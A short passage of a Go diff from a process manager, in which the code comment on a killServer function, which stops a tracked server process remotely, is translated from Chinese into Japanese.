 	_, _, _ = sess.Exec(ctx, fmt.Sprintf("kill %d 2>/dev/null; sleep 1; kill -9 %d 2>/dev/null", p.RemotePID, p.RemotePID), probeTimeout)
 }
 
-// killServer 杀平台侧 server 进程（优先本进程台账句柄；否则核对 /proc cmdline 后杀）。
+// killServer はプラットフォーム側の server プロセスを停止する（本プロセスの台帳ハンドルを優先し、なければ /proc cmdline を照合してから停止する）。
 func (m *Manager) killServer(id int64, p *Plan) {
 	if cmd, ok := m.procs[id]; ok {
 		if cmd.Process != nil {
